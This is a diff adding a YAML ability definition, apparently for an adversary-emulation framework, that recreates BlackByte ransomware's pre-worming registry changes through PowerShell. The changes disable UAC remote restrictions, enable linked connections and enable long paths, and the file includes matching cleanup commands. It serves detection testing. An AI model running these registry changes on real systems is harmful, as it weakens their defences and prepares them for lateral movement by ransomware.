@@ -1,0 +1,34 @@
+---
+- id: d2f6cb279552f1b65a9805d63eed1689
+  name: BlackByte Ransomware Registry Changes - Powershell
+  description: "This task recreates the steps taken by BlackByte ransomware before\
+    \ it worms to other machines via Powershell.  See \"Preparing to Worm\" section:\
+    \ https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n\
+    <ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n\
+    \    <li>2. Enable OS to share network connections between different privilege\
+    \ levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces\
+    \ to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys\
+    \ and their respective values will be created upon successful execution.\n"
+  tactic: multiple
+  technique:
+    attack_id: T1112
+    name: Modify Registry
+  platforms:
+    windows:
+      psh:
+        command: New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+          -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force;
+          New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+          -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force; New-ItemProperty
+          "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name LongPathsEnabled
+          -PropertyType DWord -Value 1 -Force
+        payloads: []
+        cleanup: Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+          -Name LocalAccountTokenFilterPolicy -Force -ErrorAction Ignore; Remove-ItemProperty
+          "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name
+          EnableLinkedConnections -Force -ErrorAction Ignore; Remove-ItemProperty
+          "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name LongPathsEnabled
+          -Force -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
